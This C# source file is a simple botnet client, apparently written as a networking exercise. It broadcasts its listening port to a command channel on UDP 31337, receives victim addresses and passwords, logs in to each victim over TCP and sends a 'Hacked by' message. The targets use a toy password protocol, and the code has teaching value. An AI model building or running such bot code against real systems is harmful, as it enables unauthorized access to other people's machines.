using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Bot
{
    /// <summary>
    /// This class represents the bot
    /// </summary>
    public class bot
    {
        /// <summary>
        /// fields of a bot
        /// </summary>
        private UdpClient m_listener;

        /// <summary>
        /// Method to create random port
        /// </summary>
        /// <returns></returns>
        private short getRandomPort()
        {
            Random r = new Random();
            int port = r.Next(1000, 7000);
            return Int16.Parse(port + "");
        }

        /// <summary>
        /// Method to start run the bot
        /// </summary>
        public void Start()
        {
            short portToListen = getRandomPort();
            m_listener = new UdpClient();
            m_listener.EnableBroadcast = true;
            m_listener.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, portToListen);
            m_listener.Client.Bind(groupEP);

            byte[] twoBytePort = new byte[2];
            Thread sendPortToServer = new Thread(() =>
            {
                while (true)
                {
                    Console.WriteLine("Bot is listening on port " + portToListen);
                    var data = BitConverter.GetBytes(portToListen);
                    m_listener.Send(data, data.Length, "255.255.255.255", 31337);
                    Thread.Sleep(10000);
                }
            });

            Thread getVictimForAttack = new Thread(() =>
            {
                try
                {
                    while (true)
                    {
                        var packetData = m_listener.Receive(ref groupEP);
                        byte[] vicIP = GetBytesArray(packetData, 0, 4);
                        byte[] vicPort = GetBytesArray(packetData, 4, 6);
                        byte[] vicPass = GetBytesArray(packetData, 6, 12);
                        byte[] vicServerName = GetBytesArray(packetData, 12, 44);
                        if (!StartTCPConnectionWithVictim(vicIP, vicPort, vicPass, vicServerName))
                            continue;

                    }
                }
                catch (Exception exception)
                {
                    Console.WriteLine("Error in bot");
                }
            });

            sendPortToServer.Start();
            getVictimForAttack.Start();

        }

        /// <summary>
        /// Method to get byte array between start and end indexes
        /// </summary>
        /// <param name="buffer">full byte array</param>
        /// <param name="startIndex">startIndex</param>
        /// <param name="endIndex">endIndex</param>
        /// <returns>suitable byte array</returns>
        private byte[] GetBytesArray(byte[] buffer, int startIndex, int endIndex)
        {
            byte[] bytesArr = new byte[endIndex - startIndex];
            for (int j = 0, i = startIndex; i < endIndex; j++, i++)
            {
                bytesArr[j] = buffer[i];
            }
            return bytesArr;
        }

        /// <summary>
        /// Method to start tcp connection
        /// </summary>
        /// <param name="_ip">ip of the victim</param>
        /// <param name="_port">port of the victim</param>
        /// <param name="_password">password of the victim</param>
        /// <param name="_serverName">serverName of the victim</param>
        /// <returns>if the attack succeeded</returns>
        private bool StartTCPConnectionWithVictim(byte[] _ip, byte[] _port, byte[] _password, byte[] _serverName)
        {
            byte[] bytes = new byte[1024], outputData;
            IPEndPoint remoteEP;
            Socket sender;
            int receivedDataLength;
            string inputData;
            try
            {
                string ServerName, hackedBy = "Hacked by ";
                short Port = BitConverter.ToInt16(_port, 0);
                IPAddress IpAddress = new IPAddress(_ip);
                remoteEP = new IPEndPoint(IpAddress, Port);
                sender = new Socket(IpAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                try
                {
                    sender.Connect(remoteEP);

                    receivedDataLength = sender.Receive(bytes);
                    inputData = Encoding.ASCII.GetString(bytes, 0, receivedDataLength);
                    if (!inputData.Equals("Please enter your password\r\n", StringComparison.OrdinalIgnoreCase))
                    {
                        return false;
                    }
                    sender.Send(_password);  //send the password to the victim

                    receivedDataLength = sender.Receive(bytes);
                    inputData = Encoding.ASCII.GetString(bytes, 0, receivedDataLength);
                    if (!inputData.Equals("Access granted\r\n", StringComparison.OrdinalIgnoreCase))
                    {
                        return false;
                    }
                    Console.Write(inputData);
                    ServerName = Encoding.ASCII.GetString(_serverName);
                    outputData = Encoding.ASCII.GetBytes(hackedBy + ServerName);
                    sender.Send(outputData);
                    return true;
                }
                catch (Exception exception)
                {
                    Console.WriteLine("connection with victim failed");
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();
                    return false;
                }
            }
            catch (Exception exception)
            {
                Console.WriteLine("create sender to victim failed");
                return false;
            }
        }





    }
}
